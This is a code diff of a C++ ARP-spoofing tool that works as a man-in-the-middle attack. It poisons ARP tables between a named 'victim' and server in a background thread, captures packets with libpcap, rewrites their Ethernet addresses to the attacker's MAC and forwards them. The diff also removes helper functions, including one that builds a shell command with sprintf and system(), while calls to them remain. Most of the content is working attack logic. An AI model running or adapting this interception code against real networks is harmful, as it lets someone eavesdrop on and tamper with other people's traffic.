@@ -10,6 +10,7 @@
 #include <errno.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <thread>
 
 #include <pcap.h>
 #include <netinet/ip.h>
@@ -25,10 +26,6 @@ using namespace std;
 
 void printLine();
 void printByHexData(u_int8_t *printArr, int length);
-void atoiIP(char* ch_ip, uint8_t* num_ip);
-int getAttackerMAC(uint8_t* attacker_mac, char* device);
-void getMAC(uint8_t* victim_ip, uint8_t* victim_mac);
-// void hackARP(char* device, uint8_t* server_ip, uint8_t* victim_ip);
 bool maccmp(uint8_t* a, uint8_t* b, int size);
 
 int main(int argc, char* argv[]) {
@@ -59,7 +56,8 @@ int main(int argc, char* argv[]) {
   getAttackerMAC(attacker_mac, device);
 
   // hack ARP table
-  hackARP(device, server_ip, victim_ip);
+  thread _t1(hackARP, device, server_ip, victim_ip);
+  _t1.detach();
   usleep(100000);
 
   // pcap
@@ -73,16 +71,12 @@ int main(int argc, char* argv[]) {
 	uint8_t* pkt;
   struct ether_header* ethHeader;
   struct ip* ipHeader;
-  // struct icmp* icmpHeader;
-  // struct in_addr att_addr;
 
   while(true) {
 		value_of_next_ex = pcap_next_ex(pcd, &hdr, &pkt_data);
 		switch (value_of_next_ex) {
 			case 1:{
           pkt = (uint8_t*)pkt_data;
-          cout << "before: ";
-          printByHexData(pkt, hdr->len);
 
           // Get Ethernet header
           ethHeader = (struct ether_header*)pkt;
@@ -104,10 +98,8 @@ int main(int argc, char* argv[]) {
                 pkt = (uint8_t*)pkt_data;
                 memcpy(pkt, server_mac, 6);
                 memcpy(pkt+6, attacker_mac, 6);
-                cout << "after: ";
-                printByHexData(pkt, hdr->len);
-                printLine();
                 pcap_sendpacket(pcd, pkt, hdr->len);
+                cout << "send it!" << endl;
               }
             }
           }
@@ -142,74 +134,8 @@ void printByHexData(u_int8_t *printArr, int length) {
 		cout << setw(2) << hex << (int)printArr[i] << " ";
 	}
 	cout << dec << endl;
-	// printLine();
+	printLine();
 }
-
-void atoiIP(char* ch_ip, uint8_t* num_ip) {
-  int i = 0;
-
-  char* temp = strtok(ch_ip, ".");
-  while (temp != NULL){
-    num_ip[i] = atoi(temp);
-    temp = strtok(NULL,".");
-    // printf("%d\n", num_ip[i]);
-    i++;
-  }
-}
-
-int getAttackerMAC(uint8_t* attacker_mac, char* device) {
-    struct ifreq ifr;
-    int s;
-    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-      perror("socket");
-      return -1;
-    }
-
-    strcpy(ifr.ifr_name, device);
-    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
-      perror("ioctl");
-      return -1;
-    }
-
-    memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);
-
-    close(s);
-}
-
-void getMAC(uint8_t* victim_ip, uint8_t* victim_mac) {
-    char fbuffer[18], ch_ip[20];
-    char* ch_mac[6];
-    int i = 0;
-
-    sprintf(ch_ip, "%d.%d.%d.%d", victim_ip[0], victim_ip[1], victim_ip[2], victim_ip[3]);
-
-    char system_call[50];
-    sprintf(system_call, "arp -a %s | cut -f 4 -d \" \" > mac.txt", ch_ip);
-    system(system_call);
-
-    FILE *fp = fopen("mac.txt", "r");
-    fgets(fbuffer, sizeof(fbuffer), fp);
-
-    char* temp = strtok(fbuffer, ":");
-    while (temp != NULL) {
-      victim_mac[i] = strtol(temp, NULL, 16);
-      temp = strtok(NULL, ":");
-      // printf("%02x\n", victim_mac[i]);
-      i++;
-    }
-}
-
-// void hackARP(char* device, uint8_t* server_ip, uint8_t* victim_ip) {
-//   char svr_ip[20], vctm_ip[20];
-//
-//   sprintf(svr_ip, "%d.%d.%d.%d", server_ip[0], server_ip[1], server_ip[2], server_ip[3]);
-//   sprintf(vctm_ip, "%d.%d.%d.%d", victim_ip[0], victim_ip[1], victim_ip[2], victim_ip[3]);
-//
-//   char system_call[50];
-//   sprintf(system_call, "sudo ./hackARP %s %s %s", device, svr_ip, vctm_ip);
-//   cout << system_call << endl;
-//   system(system_call);
-// }
 
 bool maccmp(uint8_t* a, uint8_t* b, int size) {
   for(int i=0; i<size; i++){
